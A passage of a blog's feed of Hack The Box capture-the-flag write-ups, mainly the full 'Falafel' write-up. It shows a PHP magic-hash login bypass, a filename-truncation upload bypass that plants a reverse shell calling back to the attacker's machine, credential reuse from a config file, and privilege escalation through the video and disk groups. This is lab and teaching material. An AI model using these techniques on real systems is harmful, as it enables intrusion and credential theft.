+&lt;p&gt;Now running history shows that there’s a tmux session (item 12) hype connected to, and running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ps -aux&lt;/code&gt; to check all running processes also shows that the tmux session is running as root.&lt;br /&gt;
+Lets connect to the same session.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hype@Valentine:~$ !12
+root@Valentine:/home/hype# id
+uid=0(root) gid=0(root) groups=0(root)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Done!&lt;/p&gt;
+
+&lt;div class=&quot;footnotes&quot; role=&quot;doc-endnotes&quot;&gt;
+  &lt;ol&gt;
+    &lt;li id=&quot;fn:1&quot; role=&quot;doc-endnote&quot;&gt;
+      &lt;p&gt;&lt;a href=&quot;www.hackthebox.eu&quot;&gt;www.hackthebox.eu&lt;/a&gt; &lt;a href=&quot;#fnref:1&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+    &lt;li id=&quot;fn:2&quot; role=&quot;doc-endnote&quot;&gt;
+      &lt;p&gt;&lt;a href=&quot;http://heartbleed.com/&quot;&gt;www.heartbleed.com&lt;/a&gt; &lt;a href=&quot;#fnref:2&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+    &lt;li id=&quot;fn:3&quot; role=&quot;doc-endnote&quot;&gt;
+      &lt;p&gt;&lt;a href=&quot;https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/&quot;&gt;Basic Linux Privilege Escalation&lt;/a&gt; &lt;a href=&quot;#fnref:3&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+    &lt;li id=&quot;fn:4&quot; role=&quot;doc-endnote&quot;&gt;
+      &lt;p&gt;&lt;a href=&quot;https://dirtycow.ninja&quot;&gt;www.dirtycow.ninja&lt;/a&gt; &lt;a href=&quot;#fnref:4&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+  &lt;/ol&gt;
+&lt;/div&gt;</content>
+
+      
+      
+      
+      
+      
+
+      <author>
+          <name>Christoffer Claesson</name>
+        
+        
+      </author>
+
+      
+
+      
+        <category term="ctf" />
+      
+
+      
+        <summary type="html">Heartbleeds and dirty cows, i feel sorry for the creator!</summary>
+      
+
+      
+      
+    </entry>
+  
+    <entry>
+      <title type="html">Falafel Writeup</title>
+      <link href="/falafel-writeup" rel="alternate" type="text/html" title="Falafel Writeup" />
+      <published>2018-06-23T00:00:00+00:00</published>
+      <updated>2018-06-23T00:00:00+00:00</updated>
+      <id>/falafel-writeup</id>
+      <content type="html" xml:base="/falafel-writeup">&lt;blockquote&gt;
+  &lt;p&gt;My writeup of the Hack the box Falafel.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Let’s kick things off with the general purpose portscan using NMAP.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Falafel$ nmap -p- -T4 -Pn 10.10.10.73
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-21 09:59 CEST
+Nmap scan report for falafel.htb (10.10.10.73)
+Host is up (0.078s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 387.79 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So SSH(22) and Web(80) are both open, so we are dealing with a web server.
+Lets enumerate the versions.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Falafel$ nmap -p22,80 -sV --version-all -Pn 10.10.10.73
+[..snip..]
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+[..snip..]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;As well perform a banner grab using Netcat&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Falafel$ nc 10.10.10.73 80
+GET / HTTP/1.1
+HTTP/1.1 400 Bad Request
+Date: Thu, 21 Jun 2018 15:12:43 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Content-Length: 303
+Connection: close
+Content-Type: text/html; charset=iso-8859-1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Cool, so we are dealing with a web server enumerated and verified the version. Doing a quick check with searchsploit yielded no result, except a user enumeration for OpenSSH Users. Nothing that is extremely interesting for us. Since we don’t have a user or password, lets check out the webserver on port 80. Before actually browse to the webpage, lets start a gobuster session to find any hidden directories and files (txt and php).&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Falafel$ gobuster -u http://10.10.10.73 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50 -x .txt,.php
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now I preface that I use Firefox, and run the connection through Burpsuite Proxy, as you never know what you might pick up. Running the connection through Burpsuite has some other benefits as well, like recording all the requests or automatic spidering.&lt;/p&gt;
+
+&lt;p&gt;Browsing to falafel we see two things, user and domain &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IT@falafel.htb&lt;/code&gt;, and “Login” which does sound interesting.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/posts/2018/06/falafel-writeup/Falafel-Lovers---Login-Page---Mozilla-Firefox_061.png&quot; alt=&quot;Falafel-Lovers---Login-Page---Mozilla-Firefox_061&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Checking the sourcecode does not reveal anything interesting. So lets go back to our gobuster session.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Gobuster v1.4.1              OJ Reeves (@TheColonial)
+=====================================================
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://10.10.10.73/
+[+] Threads      : 50
+[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+[+] Status codes : 301,302,307,200,204
+[+] Extensions   : .txt,.php
+=====================================================
+/profile.php (Status: 302)
+/uploads (Status: 301)
+/upload.php (Status: 302)
+/cyberlaw.txt (Status: 200)
+/connection.php (Status: 200)
+[..snip uninteressting stuff..]
+=====================================================
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;At this point we can make some assumptions on the results.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/connection.php&lt;/code&gt; - usually exists when there’s a database server backend&lt;br /&gt;
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/cyberlaw.txt&lt;/code&gt; - contains some interesting usernames; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lawyers&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;devs&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chris&lt;/code&gt;. But also that the uploads form is vulnerable.&lt;br /&gt;
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/uploads.php&lt;/code&gt; - Apparently vulnerable, but is protected by a login form.&lt;/p&gt;
+
+&lt;p&gt;So with that information, the next step is to try and bypass the login form.
+Generally start with trying some simple SQL Injection techniques, since we did see the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/connection.php&lt;/code&gt;. As well as scouring stackoverflow for php auth bypasses. None of that worked, so googling continues, when I did find a writeup on Magic Hashes from WhiteHat Security&lt;sup id=&quot;fnref:1&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:1&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt; (Interesting research, I recommend a read through). So what we’ll use is a simple hash collision.&lt;/p&gt;
+
+&lt;p&gt;Supplying &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;username=admin&amp;amp;password=240610708&lt;/code&gt; to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/login.php&lt;/code&gt; site will result in a Login Successful!&lt;br /&gt;
+And now we are presented with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/upload.php&lt;/code&gt; which from previous information stated, is vulnerable to some kind of file upload bypass. Another assumption is that files uploaded through this form is also added to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/uploads/&lt;/code&gt; found with gobuster.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/posts/2018/06/falafel-writeup/Falafel-Lovers---Image-Upload---Mozilla-Firefox_063.png&quot; alt=&quot;Falafel-Lovers---Image-Upload---Mozilla-Firefox_063&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Seeing that the upload form cannot browse a file to upload, but rather specify a URL we can start a simple http webserver with python.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Falafel$ python -m SimpleHTTPServer 3999
+Serving HTTP on 0.0.0.0 port 3999 ...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Seeing that it requests an image to be uploaded. I reckon that’s the first thing I should try, in order to see if it presents me with a link to my uploaded file.&lt;br /&gt;
+Uploading &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://10.10.14.7:3999/viking.png&lt;/code&gt; I get presented with this output.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;CMD: cd /var/www/html/uploads/0621-1924_63b0bd5de1c81bcd; wget 'http://10.10.14.7:3999/viking.png'
+
+--2018-06-21 19:24:49--  http://10.10.14.7:3999/viking.png
+Connecting to 10.10.14.7:3999... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 8889 (8.7K) [image/png]
+Saving to: 'viking.png'
+
+     0K ........                                              100% 19.1M=0s
+
+2018-06-21 19:24:49 (19.1 MB/s) - 'viking.png' saved [8889/8889]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Cool so that is using a tool we should recognize, wget. It also echoes out the folder it saves the image to. A simple browse to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://10.10.10.73/uploads/0621-1924_63b0bd5de1c81bcd/viking.png&lt;/code&gt; should then present us with the image.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/posts/2018/06/falafel-writeup/viking.png--PNG-Image--141---141-pixels----Mozilla-Firefox_065.png&quot; alt=&quot;viking.png--PNG-Image--141---141-pixels----Mozilla-Firefox_065&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So it gives us both the folder name where it is saved and also we have access to it… Since it is running a php backend, lets try and upload a reverse shell.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Falafel$ cp /usr/share/webshells/php/php-reverse-shell.php ./sb.php
+root@kali:~/Falafel$ sed -i -e 's/127.0.0.1/10.10.14.7/g' sb.php
+root@kali:~/Falafel$ sed -i -e 's/$port = 1234;/$port = 4000;/g' sb.php
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Having set the ip and port of my kali box, we should also put up something to catch the shell with netcat.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Falafel$ nc -lvvp 4000
+listening on [any] 4000 ...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Trying to upload &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sb.php&lt;/code&gt; using a URL, I get the response:&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;Something bad happened:
+Bad extension
+Specify a URL of an image to upload:&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Running through OWASP’s Guide to bypass filtered uploads&lt;sup id=&quot;fnref:2&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:2&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;2&lt;/a&gt;&lt;/sup&gt;, Didn’t really give anything either. So again after some googling, I had the idea that since the upload form is using wget to fetch files. Then maybe supplying a filename longer then linux can handle, maybe we can get it to “cut off” the picture file ending.&lt;br /&gt;
+Popping over to UnixStackExchange&lt;sup id=&quot;fnref:3&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:3&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;3&lt;/a&gt;&lt;/sup&gt;, we get to know that a linux filename can be 255 characters long. So maybe if I find a filename that is long enough, that might cause an overflow, thus removing all characters over the limit.&lt;/p&gt;
+
+&lt;p&gt;So I tested with a 245 character long filename, and the response was:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Upload Succsesful!
+Output:
+CMD: cd /var/www/html/uploads/0621-2200_805b0c016de450a8; wget 'http://10.10.14.7:3999/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.png'
+
+The name is too long, 245 chars total.
+Trying to shorten...
+New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+[..snip..]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So now we can see that supplying a 232 character long filename like&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Falafel$ python -c &quot;print 'A'*232 + '.php' + '.jpg'&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Containing our php code and a ‘GIF89’ at the beginning, will using the ‘.jpg’ bypass the image filter, but the script will shorted and cut out the last 4 characters, leaving the file names as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;'A'*232 + '.php'&lt;/code&gt;.
+So taking my &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sb.php&lt;/code&gt; reverse shell, and renaming it to the convention&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;CMD: cd /var/www/html/uploads/0621-2211_287036c71d5619df; wget 'http://10.10.14.7:3999/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.jpg'
+
+The name is too long, 240 chars total.
+Trying to shorten...
+[..snip..]
+2018-06-21 22:11:25 (338 MB/s) - 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php' saved [3466/3466]
+[..snip..]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now doing a curl to will trigger the backdoor and kick back a shell.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Falafel$ curl http://10.10.10.73/uploads/0621-2211_287036c71d5619df/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Falafel$ nc -lvvp 4000
+listening on [any] 4000 ...
+connect to [10.10.14.7] from falafel.htb [10.10.10.73] 47088
+Linux falafel 4.4.0-112-generic #135-Ubuntu SMP Fri Jan 19 11:48:36 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
+ 22:15:33 up 3 days, 17:54,  1 user,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+yossi    tty1                      Mon04    3days  0.05s  0.04s -bash
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ bash -i
+www-data@falafel:/$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@falafel:/$
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now that worked fairly terrific! Remember &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/connection.php&lt;/code&gt; that where discovered earlier, lets have a look into that one.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@falafel:/var/www/html$ cat connection.php
+&amp;lt;?php
+   define('DB_SERVER', 'localhost:3306');
+   define('DB_USERNAME', 'moshe');
+   define('DB_PASSWORD', 'falafel[snip]');
+   define('DB_DATABASE', 'falafel');
+   [..snip..]
+?&amp;gt;
+www-data@falafel:/var/www/html$
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Nice DB Creds. Well maybe they are reusing that password?&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Falafel$ ssh moshe@10.10.10.73
+moshe@10.10.10.73's password: falafel[snip]
+$ bash -i
+moshe@falafel:~$ id
+uid=1001(moshe) gid=1001(moshe) groups=1001(moshe),4(adm),8(mail),9(news),22(voice),25(floppy),29(audio),44(video),60(games)
+moshe@falafel:~$ ls -alsh user.txt
+4.0K -r-------- 1 moshe moshe 33 Nov 27  2017 user.txt
+moshe@falafel:~$
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;That takes care of the user flag. Time for some further enumeration as user:moshe. Now that we have a ssh shell, lets see whats stored in the DB.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mysql -u moshe -p
+Enter password: falafel[snip]
+[..snip..]
+mysql&amp;gt; use falafel
+Database changed
+mysql&amp;gt; select * from users;
++----+----------+----------------------------------+--------+
+| ID | username | password                         | role   |
++----+----------+----------------------------------+--------+
+|  1 | admin    | 0e462096931906507119562988736854 | admin  |
+|  2 | chris    | d4ee02a22fc872e36d9e3751ba72ddc8 | normal |
++----+----------+----------------------------------+--------+
+mysql&amp;gt;exit;
+moshe@falafel:~$
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Hash cracking time, favourite time!… Which didn’t yield any good results.
+So back to enumeration. checking groups you can see that there was some non-default assigned to moshe&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;moshe@falafel:~$ cat /etc/group|grep video
+video:x:44:moshe
+moshe@falafel:~$
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now video is an interesting group, according to Ubuntu Wiki&lt;sup id=&quot;fnref:4&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:4&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;4&lt;/a&gt;&lt;/sup&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;The &quot;video&quot; group can access /dev/fb0&lt;/code&gt; which is a framebuffer.
+So with that in mind we can run some simple commands and capture the image from fb0. But to be able to convert it into a image we also need the resolution of fb0.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;moshe@falafel:~$ cat /dev/fb0 &amp;gt; /tmp/sb.raw
+moshe@falafel:~$ cat /sys/class/graphics/fb0/virtual_size
+1176,885
+moshe@falafel:~$
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Using SCP or your own preference in transferring the image to your own Kali, the script &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;iraw2png.pl&lt;/code&gt;&lt;sup id=&quot;fnref:5&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:5&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;5&lt;/a&gt;&lt;/sup&gt; can be used to convert the “raw” image to a viewable png. which gets us the user:yossi password.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh yossi@10.10.10.73
+yossi@10.10.10.73's password: Moshe[..snip..]
+yossi@falafel:~$ cat /etc/group | grep disk
+disk:x:6:yossi
+yossi@falafel:~$
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Again we see that yossi is in an interesting group “disk” gives the permission for users in the group to read contents of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dev/sdX&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;yossi@falafel:~$ ls /dev/sda*
+/dev/sda  /dev/sda1  /dev/sda2  /dev/sda5
+yossi@falafel:~$ strings /dev/sda5 | grep root.txt
+[..snip..]
+echo &quot;EatSleepPwnRepeat&quot; &amp;gt; root.txt
+[..snip..]
+yossi@falafel:~$
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This was a really interesting box!&lt;br /&gt;
+Done!&lt;/p&gt;
+
+&lt;div class=&quot;footnotes&quot; role=&quot;doc-endnotes&quot;&gt;
+  &lt;ol&gt;
+    &lt;li id=&quot;fn:1&quot; role=&quot;doc-endnote&quot;&gt;
+      &lt;p&gt;&lt;a href=&quot;https://www.whitehatsec.com/blog/magic-hashes/&quot;&gt;Magic Hashes&lt;/a&gt; &lt;a href=&quot;#fnref:1&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+    &lt;li id=&quot;fn:2&quot; role=&quot;doc-endnote&quot;&gt;
+      &lt;p&gt;&lt;a href=&quot;https://www.owasp.org/index.php/Unrestricted_File_Upload&quot;&gt;OWASP Unrestricted File Upload&lt;/a&gt; &lt;a href=&quot;#fnref:2&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+    &lt;li id=&quot;fn:3&quot; role=&quot;doc-endnote&quot;&gt;
+      &lt;p&gt;&lt;a href=&quot;https://unix.stackexchange.com/questions/32795/what-is-the-maximum-allowed-filename-and-folder-size-with-ecryptfs&quot;&gt;Unix Stack Excange&lt;/a&gt; &lt;a href=&quot;#fnref:3&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+    &lt;li id=&quot;fn:4&quot; role=&quot;doc-endnote&quot;&gt;
+      &lt;p&gt;&lt;a href=&quot;https://wiki.ubuntu.com/Security/Privileges&quot;&gt;Ubuntu Wikipedia&lt;/a&gt; &lt;a href=&quot;#fnref:4&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+    &lt;li id=&quot;fn:5&quot; role=&quot;doc-endnote&quot;&gt;
+      &lt;p&gt;&lt;a href=&quot;https://www.cnx-software.com/2010/07/18/how-to-do-a-framebuffer-screenshot/&quot;&gt;iraw2png.pl&lt;/a&gt; &lt;a href=&quot;#fnref:5&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+  &lt;/ol&gt;
+&lt;/div&gt;</content>
+
+      
+      
+      
+      
+      
+
+      <author>
+          <name>Christoffer Claesson</name>
+        
+        
+      </author>
+
+      
+
+      
+        <category term="ctf" />
+      
+
+      
+        <summary type="html">My writeup of the Hack the box Falafel.</summary>
+      
+
+      
+      
+    </entry>
+  
+    <entry>
+      <title type="html">Chatterbox Writeup</title>
+      <link href="/chatterbox-writeup" rel="alternate" type="text/html" title="Chatterbox Writeup" />
+      <published>2018-06-18T00:00:00+00:00</published>
+      <updated>2018-06-18T00:00:00+00:00</updated>
+      <id>/chatterbox-writeup</id>
+      <content type="html" xml:base="/chatterbox-writeup">&lt;blockquote&gt;
+  &lt;p&gt;My writeup of the Hack the box Chatterbox.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;A box that warranted a lot of resets and frustrations. Due to the fact that the initial shell was provided with a Buffer Overflow, and crashing the service at the same time.&lt;/p&gt;
+
